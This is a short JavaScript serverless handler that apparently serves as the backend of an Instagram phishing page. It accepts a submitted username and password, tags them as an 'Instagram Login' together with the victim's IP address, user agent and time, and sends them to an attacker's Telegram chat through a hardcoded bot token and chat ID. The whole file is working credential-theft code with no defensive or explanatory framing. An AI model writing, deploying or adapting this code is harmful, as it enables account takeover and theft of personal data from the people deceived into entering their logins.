export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing fields' });
  }

  const botToken = '8891374192:AAHPO0sSO8LHDXCeTJS9Rbf7AGzQgOy7EnI';
  const chatId = '6265529524';

  const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
  const ua = req.headers['user-agent'] || 'unknown';
  const time = new Date().toISOString();

  const text = `🔐 Instagram Login\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📱 UA: ${ua}\n⏰ Time: ${time}`;

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text })
    });
  } catch (err) {
    console.error('Telegram error:', err);
  }

  return res.status(200).json({ ok: true });
}
